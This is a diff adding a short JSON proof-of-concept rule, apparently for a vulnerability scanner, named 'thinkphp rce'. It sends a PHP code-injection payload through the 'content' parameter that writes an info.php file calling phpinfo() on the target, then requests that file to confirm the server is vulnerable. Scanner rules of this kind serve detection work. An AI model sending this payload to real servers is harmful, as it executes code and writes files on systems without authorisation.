@@ -1,0 +1,25 @@
+{
+  "pocs": [
+    {
+      "name": "thinkphp rce",
+      "level": 5,
+      "requests": [
+        {
+          "path_args": "/index.php?a=fetch&content=<?=file_put_contents(\"info.php\",\"<?php phpinfo();?>\");?>",
+          "rules": {
+            "status_code": 200
+          }
+        },
+        {
+          "path_args": "/info.php",
+          "rules": {
+            "status_code": 200,
+            "body": [
+              "PHP Version"
+            ]
+          }
+        }
+      ]
+    }
+  ]
+}
